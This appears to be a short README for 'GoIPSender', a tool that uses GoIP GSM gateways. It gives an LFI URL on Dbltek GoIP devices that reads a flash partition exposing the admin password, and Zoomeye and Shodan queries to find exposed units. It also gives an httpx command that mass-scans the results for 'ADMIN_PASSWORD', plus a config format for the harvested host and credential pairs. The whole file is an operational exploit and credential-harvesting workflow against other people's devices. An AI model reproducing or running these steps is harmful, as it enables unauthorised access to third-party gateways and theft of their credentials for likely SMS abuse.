# GoIPSender

# Config
``host|user:pass,line``
example: ``177.30.254.36:81|admin:admin,8``
## LFI GoIP Dbltek
``http://ip:port/default/en_US/frame.html?content=/dev/mtdblock/5``
### Export results
**Zoomeye**: ``/default/en_US/status.html``
<br/>
**Shodan**: ``HTTP/1.0 401 Please Authenticate WWW-Authenticate: Basic realm="Please Login"``
### Check valid targets
```sh
cat exportresults | httpx -mc 200 -s -path "/default/en_US/frame.html?content=/dev/mtdblock/5" -ms "ADMIN_PASSWORD" -t | grep -iEv "(RoIP|Bank)"
```
<br/><br/>
![image](https://user-images.githubusercontent.com/74382279/198907983-7b0c6075-fdca-41ef-aba9-fe393d0b7b3e.png)
